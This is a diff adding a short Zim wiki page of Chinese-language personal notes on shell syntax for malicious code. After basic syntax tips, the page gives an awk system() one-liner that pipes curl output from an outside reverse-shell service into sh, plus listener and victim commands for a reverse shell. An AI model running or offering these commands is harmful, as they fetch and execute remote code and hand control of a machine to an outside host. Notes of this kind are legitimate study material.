@@ -1,0 +1,22 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-25T14:18:36+08:00
+
+====== shell语法-恶意代码 ======
+Created 星期一 25 十一月 2024
+
+https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html
+
+分号 ; 在一行内分割多个命令
+井号 # 单行注释
+
+cat file1 [... filen]
+
+awk 执行任意指令 （一定需要三个参数，system里也能写点别的，但是会弹出好多行，还没太懂）
+awk '{system("curl https://your-shell.com/<ip>:<port>|sh")}' file
+
+远程执行shell: Reverse Shell as a Service https://your-shell.com
+主机：
+nc -l <port>
+被控机：
+curl https://your-shell.com/host:port|sh
